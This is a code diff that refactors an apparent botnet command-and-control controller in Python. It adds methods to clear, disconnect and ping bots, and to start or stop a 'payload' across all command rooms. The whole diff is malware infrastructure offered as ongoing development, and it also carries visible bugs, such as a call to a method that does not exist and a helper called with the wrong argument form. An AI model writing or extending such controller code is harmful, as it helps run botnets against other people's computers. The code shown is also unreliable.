@@ -91,6 +91,15 @@ class CommandRoom:
 
     def leave(self) -> bool:
         return self.room.leave()
+    
+    def clear_bot(self, bot_id: str) -> bool:
+        return self.send_cmd(f"CLEAR:{bot_id}")
+    
+    def clear(self) -> bool:
+        return self.send_cmd("CLEAR:ALL")
+    
+    def disconnect_bot(self):
+        self.send_cmd("DISCONNECT")
 
     def send_cmd(self, cmd) -> bool:
         if len(self.bots) > 0:
@@ -147,12 +156,10 @@ class BotnetController:
             elif room.name == "announcements":
                 self.announce_room = self.join_room(ANNOUNCE_ROOM_ID)
 
-        
-    def send_to_all(self, command: str):
+    def for_all_rooms(self, f, **args):
         with self.command_room_lock:
-            for _, cmd_room in self.command_rooms.items():
-                if len(cmd_room.bots) > 0:
-                    cmd_room.send_cmd(command)
+            for cmd_room in self.command_rooms.values():
+                f(cmd_room, **args)
             
     def assign_bot(self, botdata, roomid):
         """
@@ -161,7 +168,7 @@ class BotnetController:
         self.command_rooms[roomid].add_bot(botdata)
         
     def clear_room(self, room: CommandRoom):
-        room.send_cmd("CLEAR:ALL")
+        room.clear()
         
     def delete_room(self, room: CommandRoom):
         with self.command_room_lock:
@@ -202,7 +209,7 @@ class BotnetController:
             if not (self.pong_window_start <= pong_origin <= self.pong_window_start + self.pong_window_dur + 5):
                 # pong too late :(
                 print("PONG TOO LATE")
-                self.command_rooms[room_id].send_cmd(f"CLEAR:{bot_id}")
+                self.command_rooms[room_id].clear_bot(bot_id)
                 return
             
             with self.command_room_lock:
@@ -222,20 +229,20 @@ class BotnetController:
         room.start_payload()
     
     def start_payload_all_rooms(self):
-        with self.command_room_lock:
-            for _, cmd_room in self.command_rooms.items():
-                self.start_payload_on_room(cmd_room)
+        self.for_all_rooms(self.start_payload_on_room)
 
     def stop_payload_on_room(self, room: CommandRoom):
         room.stop_payload()
     
     def stop_payload_all_rooms(self):
-        with self.command_room_lock:
-            for _, cmd_room in self.command_rooms.items():
-                self.stop_payload_on_room(cmd_room)
+        self.for_all_rooms(self.stop_payload_on_room)
 
-    def stop_bot(self, room: CommandRoom, bot_id: str) -> bool:
-        return room.remove_bot(bot_id)
+    def disconnect_bots(self, room: CommandRoom):
+        return room.disconnect_bots()
+
+    def disconnect_all_bots(self):
+        self.for_all_rooms(CommandRoom.disconnect_bot)
+
 
     def ping_loop(self):
         while True:
@@ -246,7 +253,7 @@ class BotnetController:
                     room.set_all_inactive()
 
             self.pong_window_start = time.time()
-            self.send_to_all("PING")
+            self.for_all_rooms(CommandRoom.send_cmd, "PING")
             time.sleep(self.pong_window_dur) # give time for pongs to come in
             
             # and Sweep
